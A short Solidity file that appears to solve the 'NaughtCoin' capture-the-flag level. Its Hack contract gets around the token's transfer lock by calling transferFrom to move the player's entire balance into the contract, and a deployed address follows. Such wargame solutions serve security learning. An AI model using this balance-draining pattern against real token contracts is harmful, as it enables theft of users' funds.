// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
  function player() external view returns (address);
}
interface IERC20 {
  function balanceOf(address account) external view returns (uint256);
  function  approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender,address recipient,uint256 amount)external returns (bool);
}

contract Hack {
    function pwn(IERC20 coin) external {
        address player = INaughtCoin(address(coin)).player();
        uint256 bal = coin.balanceOf(player);
        coin.transferFrom(player, address(this), bal);
    }
}
//0x270CFd2527416122C70E6BbF156f4acC1Ee63C09
